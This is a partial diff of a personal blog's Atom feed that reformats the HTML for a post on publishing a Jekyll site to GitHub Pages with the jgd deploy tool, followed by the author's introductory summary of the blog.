-  &lt;li&gt;Install &lt;a href=&quot;https://github.com/yegor256/jekyll-github-deploy&quot;&gt;jgd&lt;/a&gt;. Jekyll-Github-Deploy (jgd) is a tool that will build your Jekyll site and push it to GitHub for you.
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; gem install jgd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Build your site from the source branch and push it to the master branch!
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; bundle exec jgd --branch master --branch-from source
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Enjoy the freedom of plugins with Jekyll!&lt;/li&gt;
+&lt;li&gt;Create a new branch called 'source'. Since the repository is what GitHub terms a &amp;quot;user&amp;quot; site and not a &amp;quot;project&amp;quot; site, the only publishing source available is the master branch. This means that the code GitHub will build and publish will be taken from the master branch, so we will need another branch to store the source code for building our blog! &lt;strong&gt;NOTE:&lt;/strong&gt; If you do this, I would recommend changing the default branch of your repo to 'source'!&lt;pre&gt;&lt;code&gt;git checkout -b source
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;Install &lt;a href=&quot;https://github.com/yegor256/jekyll-github-deploy&quot;&gt;jgd&lt;/a&gt;. Jekyll-Github-Deploy (jgd) is a tool that will build your Jekyll site and push it to GitHub for you.&lt;pre&gt;&lt;code&gt;gem install jgd
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;Build your site from the source branch and push it to the master branch!&lt;pre&gt;&lt;code&gt;bundle exec jgd --branch master --branch-from source
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;Enjoy the freedom of plugins with Jekyll!&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
-&lt;p&gt;So, welcome to my blog! I briefly described how I set up my own blog with Jekyll and GitHub Pages, using whatever plugins/themes I wanted. All the source code for this blog (both master and source branch) is available &lt;a href=&quot;https://github.com/aidanstansfield/aidanstansfield.github.io&quot;&gt;here&lt;/a&gt;. Hope you enjoyed!&lt;/p&gt;</content><author><name></name></author><summary type="html">G’day! Today marks the day that I finally became one of those guys who has his own blog. The main reason for making this blog is so that I can show it off to other people (emplyers, friends, etc.). In this blog, I plan on documenting various things I do related to IT that I find interesting and worth sharing. You can expect this to include some home projects on my raspberry pi, walkthroughs of hackthebox/ctf’s, and generally anything else I find cool. Also, I find myself funny, so please try not to cringe too hard at what I write/take offence from anything I say.</summary></entry></feed>
+&lt;p&gt;So, welcome to my blog! I briefly described how I set up my own blog with Jekyll and GitHub Pages, using whatever plugins/themes I wanted. All the source code for this blog (both master and source branch) is available &lt;a href=&quot;https://github.com/aidanstansfield/aidanstansfield.github.io&quot;&gt;here&lt;/a&gt;. Hope you enjoyed!&lt;/p&gt;</content><author><name></name></author><summary type="html">G'day! Today marks the day that I finally became one of those guys who has his own blog. The main reason for making this blog is so that I can show it off to other people (emplyers, friends, etc.). In this blog, I plan on documenting various things I do related to IT that I find interesting and worth sharing. You can expect this to include some home projects on my raspberry pi, walkthroughs of hackthebox/ctf's, and generally anything else I find cool. Also, I find myself funny, so please try not to cringe too hard at what I write/take offence from anything I say.</summary></entry></feed>
